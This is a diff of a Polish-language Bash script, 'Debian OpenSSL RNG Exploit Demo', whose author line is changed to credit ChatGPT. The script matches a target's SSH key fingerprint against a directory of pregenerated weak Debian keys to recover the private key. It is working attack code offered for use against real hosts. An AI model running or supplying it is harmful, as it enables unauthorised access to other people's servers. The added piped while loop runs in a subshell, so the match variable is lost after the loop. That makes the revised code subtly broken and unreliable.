@@ -1,23 +1,31 @@
 #!/bin/bash
-
 # ================================
 # Debian OpenSSL RNG Exploit Demo
-# Autor: Newlife.org.pl
+# Autor: ChatGPT & <Twoje Imię>
+# Styl: hacker-ish, z licznikiem i obsługą błędów
 # ================================
 
 TARGET_IP=$1
 USER=${2:-root}
 KEYS_DIR=${3:-/path/to/debian-ssh}
 
+# Kolory
 RED="\e[31m"
 GREEN="\e[32m"
 YELLOW="\e[33m"
 BLUE="\e[34m"
 RESET="\e[0m"
 
+# Sprawdzenie argumentów
 if [ -z "$TARGET_IP" ]; then
     echo -e "${RED}[!] Użycie: $0 <IP> [user] [keys_dir]${RESET}"
     echo -e "    Przykład: $0 192.168.56.101 msfadmin /usr/share/debian-ssh"
+    exit 1
+fi
+
+# Sprawdzenie, czy katalog istnieje
+if [ ! -d "$KEYS_DIR" ]; then
+    echo -e "${RED}[!] Katalog z kluczami nie istnieje: $KEYS_DIR${RESET}"
     exit 1
 fi
 
@@ -41,19 +49,21 @@ echo -e "${YELLOW}[+] Szukam w repozytorium podatnych kluczy...${RESET}"
 COUNT=0
 MATCH_FILE=""
 
-for key in $(find "$KEYS_DIR" -type f ! -name "*.pub"); do
+# Bezpieczna pętla obsługująca wszystkie nazwy plików
+find "$KEYS_DIR" -type f ! -name "*.pub" -print0 | while IFS= read -r -d '' key; do
     ((COUNT++))
-    # efekt „hakera”: licznik sprawdzonych kluczy
     echo -ne "${BLUE}[*] Sprawdzam klucz $COUNT: $key\r${RESET}"
 
+    # Próba wygenerowania fingerprintu, pomijamy błędy
     KEY_FINGERPRINT=$(ssh-keygen -lf "$key" 2>/dev/null | awk '{print $2}')
-    if [[ "$KEY_FINGERPRINT" == "$FINGERPRINT" ]]; then
+    if [ "$KEY_FINGERPRINT" == "$FINGERPRINT" ]; then
         MATCH_FILE=$key
         echo -e "\n${GREEN}[+] Znaleziono pasujący klucz prywatny: $MATCH_FILE${RESET}"
         break
     fi
 done
 
+# Sprawdzenie, czy znaleziono klucz
 if [ -z "$MATCH_FILE" ]; then
     echo -e "\n${RED}[!] Nie znaleziono pasującego klucza w $KEYS_DIR${RESET}"
     exit 1
